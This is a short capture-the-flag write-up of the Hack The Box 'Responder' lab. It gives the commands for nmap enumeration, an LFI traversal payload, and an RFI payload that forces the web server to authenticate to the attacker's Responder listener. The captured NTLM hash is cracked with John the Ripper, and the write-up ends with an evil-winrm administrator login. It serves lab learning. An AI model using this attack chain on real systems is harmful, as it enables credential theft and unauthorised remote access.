## Lab Title: Responder
- Date: 2025-08-04
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 1

### 1. Scenario Summary
- Learn to use Responder to capture credentials, RFI, Evil-WinRm

### 2. Findings
- IP redirected         >> Domain: `unika.htb`
- Nmap                  >> Enumeration
    - `nmap $ip -A -sV --top-ports 10000`

- `page`                  >> Used to load different language versions
- LFI                   >> Local File Inclusion: `../../../../../../../../windows/system32/drivers/etc/hosts`
- RFI                   >> Remote File Inclusion: `//10.10.14.6/somefile`
- NTLM                  >> New Technology LAN Manager
- Responder             >> Tool used to **poison LLMNR, NBT-NS, and MDNS responses on a local network**
    - *captures credentials (like NTLM hashes) from misconfigured systems*
    - It Works:
        - *Listens on the local network for name resolution requests (LLMNR/NBT-NS/mDNS)*
        - **When a system can't resolve a name, Responder replies with a fake IP**
        - *It then captures credentials (like NTLM hashes) sent during the authentication attempt*

- Attack Steps:
    1. `responder -I tun0` >> listens on local network now
    2. `http://unika.htb/index.php?page=//10.10.14.7/TrickServerFile` >> we connect from Web Page

    3. With RFI(given IP is our IP >> tun0) >> when it connects to our machine:
        - Responder catches the credentials: client's IP, username, Password Hash

    4. After the NTLM Hash is obtained >> `John The Ripper` to brute-force the hash
        - Cracked with it >> password: `badminton`

    5. Later with Nmap >> I got it that on remote target >> `5985` port is open
        - **WinRM** (windows remote management) uses this port over HTTP

    6. Using tool: `evil-winrm` >> we connect to the user: administrator with obtained password from `John`:
        - `evil-winrm -i $ip -u administrator -p badminton`
        - `dir C:\flag.txt /s /b` >> `/s` >> recursive >> `/b` >> bare format just path
        - `type flag.txt` >> Voila

### 3. Idea
- With RFI >> force web server to connect to your machine >> while Responder listens on your machine
    to capture credentials from Web Server >> client IP, username, Password Hash >> with this hash
    run John >> obtained password >> connect to target with open port `5985` of WinRM >> Use
    `evil-winrm` >> voila!
